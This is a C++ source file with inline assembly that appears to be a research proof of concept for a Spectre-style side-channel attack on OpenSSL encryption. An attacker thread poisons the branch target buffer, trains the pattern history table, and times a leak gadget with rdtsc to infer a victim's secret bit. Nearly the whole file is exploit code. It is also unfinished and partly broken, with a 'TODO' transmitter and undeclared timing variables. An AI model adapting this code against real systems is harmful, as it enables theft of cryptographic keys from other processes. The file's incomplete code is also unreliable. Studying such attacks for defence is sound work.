#include <include/internal/evp_int.h>
#include <cstring>
#include "../../include/util.h"
#include "../../include/timingtest.h"


int lock = 0; // sync lock: 0->victim; 1->attacker
int victim = 0;
int attacker = 1;
int readyforpoison = 0;

char zero[1024];
char one[1024];

void *attacker_thread( void *ptr );
void *victim_thread( void *ptr );

void sync_thread(int ctrl) {
    while (lock != ctrl) {sched_yield();}
}

void lock_free(int ctrl) {
    if (ctrl == victim) lock = attacker;
    else lock = victim;
    sched_yield();
}

int ret_encrypted(void *key) {
    // Credit: https://github.com/HexHive/SMoTherSpectre
    unsigned char ciphertext[16];
    unsigned char plaintext[16] = "Dummy";
    int outl;

    int ret = EVP_EncryptUpdate((EVP_CIPHER_CTX*)key, ciphertext, &outl, plaintext, 16);
    for (size_t i = 0; i < 16; i++) printf("%02x ",ciphertext[i]); 
    printf("\n");
    
}

extern "C" int leak_gadget(void *ptr);
__asm__(
  "leak_gadget:\n"
  "  mov  (%rdi), %r12w\n"     // r12 = [ptr[0]]
  "  mov  $1, %r13w\n"   // r13 = control
  "  cmp  %r13w, %r12w\n"     // if r12==r13 jump to target_branch
  "  jne  target_branch\n"
  "  ret\n"
  "target_branch:\n"
  "  ret\n"
);


class OpenSSLEVPObj {
    // Credit: https://github.com/IAIK/transientfail
    public:
        virtual void evp_custom_enc() {
        }
 
};

class VicObj : public OpenSSLEVPObj {
    // Credit: https://github.com/IAIK/transientfail
    private:
        EVP_CIPHER_CTX *secret_key;
    public:
        VicObj(void *key) {
            secret_key = (EVP_CIPHER_CTX*)key;
        }

        void evp_custom_enc() {
            ret_encrypted(secret_key); // OpenSSL Encryption
        }

};

class AtkObj : public OpenSSLEVPObj {
    // Credit: https://github.com/IAIK/transientfail
    private:
        EVP_CIPHER_CTX *known_key;
    public:
        AtkObj(void *key) {
            known_key = (EVP_CIPHER_CTX*)key;
        }

        void evp_custom_enc() {
            // TODO: Transmitter gadget
            leak_gadget(known_key);
        }
};

void victim_func(OpenSSLEVPObj* evpObj) {
    // Credit: https://github.com/IAIK/transientfail
  evpObj->evp_custom_enc();
}


int main(int argc, char ** argv) {
    int i = 0;
    int ret_a, ret_v;
    pthread_t atk, vic;

    std::memset(zero, 0, sizeof(zero));
    std::memset(one, 1, sizeof(one));

    ret_a = pthread_create(&atk, NULL, attacker_thread, (void*)(intptr_t) i);
    ret_a = pthread_create(&vic, NULL, victim_thread, (void*)(intptr_t) i);

    pthread_join(atk, NULL);
    pthread_join(vic, NULL); 
}


void *attacker_thread( void *ptr ) {
    sync_thread(attacker);
    const unsigned char atk_key[] = "83b02ec62e1562cb4a0e6fa22a6b3315";
    printf("Attacker intializing...");
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) 
        printf("Failed\n");
    unsigned char temp_1[16];
    // Setup the encryption keys
    EVP_EncryptInit(ctx, EVP_aes_128_xts(), atk_key, temp_1); // Attacker
    printf(" Initialized\n");
    lock_free(attacker);


    sync_thread(attacker);
    AtkObj* atk_evp = new AtkObj(ctx);
    atk_evp->evp_custom_enc();
    // printf("%d\n",ret_encrypted(ctx));
    lock_free(attacker);

    while (!readyforpoison) {};
    // poison btb
    printf("Poisoing BTB\n");
    for(int i = 0; i < 1000; i++) {
      victim_func(atk_evp);
    }
    randomize_pht();
    mfence();

    // PHT train
    leak_gadget(&zero);
    leak_gadget(&zero);
    leak_gadget(&zero);
    mfence();

    readyforpoison = false;
    sched_yield();
    // lock_free(attacker);

    uint64_t timer;

    leak_gadget(&one);
    mfence();
    start = rdtsc();
    leak_gadget(&one);
    end = rdtsc();
    timer = end - start;

    if (timer > 140) printf("Mispredition %lu: secret bit is 1\n",timer);
    else printf("Correct prediction %lu: secret bit is 0",timer);

    printf("Exiting attacker\n");
    lock_free(attacker);
}

void *victim_thread( void *ptr ) {
    sync_thread(victim);
    const unsigned char vic_key[] = "752a0ac5ed45dc71c45a46a39211637b";
    printf("Victim intializing...");
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) 
        printf("Failed\n");
    unsigned char temp_1[16];
    // Setup the encryption keys
    EVP_EncryptInit(ctx, EVP_aes_128_xts(), vic_key, temp_1); // Victim
    printf(" Initialized\n");
    lock_free(victim);


    sync_thread(victim);
    // printf("%d\n",ret_encrypted(ctx));
    VicObj* victim_evp = new VicObj(ctx);
    victim_evp->evp_custom_enc();
    lock_free(victim);

    readyforpoison = true;

    while (readyforpoison) {sched_yield();} // Yield to preserve one-level;
    
    victim_func(victim_evp); // Victim execution (call the EVP_EncryptUpdate)
    printf("Exiting victim\n");
    lock_free(victim);
    
}